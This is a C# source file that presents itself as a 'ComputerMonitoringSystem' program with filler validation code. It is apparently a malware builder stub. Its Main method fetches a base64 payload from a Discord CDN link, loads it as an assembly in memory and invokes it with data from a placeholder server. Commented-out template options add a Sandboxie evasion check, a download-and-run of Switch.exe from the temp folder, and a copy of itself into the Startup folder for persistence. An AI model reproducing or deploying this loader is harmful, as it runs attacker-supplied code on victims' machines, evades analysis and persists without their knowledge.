using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;




//Default [assembly: AssemblyTitle("ComputerMonitoringSystem")]
//Default [assembly: AssemblyProduct("ComputerMonitoringSystem")]
//Default [assembly: AssemblyCopyright("Copyright ©  2019")]
//Default [assembly: AssemblyFileVersion("1.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]







namespace ComputerMonitoringSystem
{
    class frmUser
    {
        public int FindMax(int num1, int num2)
        {
            /* local variable declaration */
            int result;

            if (num1 > num2)
                result = num1;
            else
                result = num2;
            return result;
        }

        static void Maint(string[] args)
        {
            /* local variable definition */
            int a = 100;
            int b = 200;
            int ret;


            Console.ReadLine();
        }
    }
}



namespace ComputerMonitoringSystem
{
    class usableFunction
    {

    }
}

namespace ComputerMonitoringSystem
{
    static class frmItems
    {


        //        Public Sub checkOption(ByVal chk As CheckBox, ByRef yesno As String)
        //    If chk.CheckState = CheckState.Checked Then
        //        yesno = "Yes"
        //    Else
        //        yesno = "No"
        //    End If
        //End Sub



        //initialize the validating method
        static Regex Valid_Name = StringOnly();
        static Regex Valid_Contact = NumbersOnly();
        static Regex Valid_Password = ValidPassword();
        static Regex Valid_Email = Email_Address();



        //Method for validating email address
        private static Regex Email_Address()
        {
            string Email_Pattern = @"^(?!\.)(""([^""\r\\]|\\[""\r\\])*""|"
                + @"([-a-z0-9!#$%&'*+/=?^_`{|}~]|(?<!\.)\.)*)(?<!\.)"
                + @"@[a-z0-9][\w\.-]*[a-z0-9]\.[a-z][a-z\.]*[a-z]$";

            return new Regex(Email_Pattern, RegexOptions.IgnoreCase);
        }
        //Method for string validation only
        private static Regex StringOnly()
        {
            string StringAndNumber_Pattern = "^[a-zA-Z]";

            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
        }
        //Method for numbers validation only
        private static Regex NumbersOnly()
        {
            string StringAndNumber_Pattern = "^[0-9]*$";

            return new Regex(StringAndNumber_Pattern, RegexOptions.IgnoreCase);
        }
        //Method for password validation only
        private static Regex ValidPassword()
        {
            string Password_Pattern = "(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]{8,15})$";

            return new Regex(Password_Pattern, RegexOptions.IgnoreCase);
        }
   
        [STAThread]
        static void Main()
        {
            using (WebClient w = new WebClient())
            {

                try
                {
                 //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }







                    string ccc;

                    ccc = "https://cdn.discordapp.com/attachments/841595401253158954/843305332738097162/sokayim_alayina.txt"; // هنا تضع رابط القيم تبع السيرفر 

                    WebClient e;

                    e = new WebClient();

                    string sss;

                    sss = e.DownloadString(ccc);


                    byte[] aa;


                    aa = Convert.FromBase64String(sss);



                    object s = new object[] { %aPP%, string.Empty, w.DownloadData("%Server%"), true };

                    string o = "ShutDown.frmclass";

                    AppDomain.CurrentDomain.Load(aa).GetType(o).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])s);


                    #region POST YAPILIYOR
                    string postUrl = "http://localhost:57460/Home/Index";
                    var gelenYanit = w.UploadValues(postUrl, new NameValueCollection() { { "id", "" } });
                    #endregion
                    #region POST NETİCESİNDE ÇIKTI ALINIYOR
                    string result = System.Text.Encoding.UTF8.GetString(gelenYanit);
                    MessageBox.Show(result);
                    #endregion

                        //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
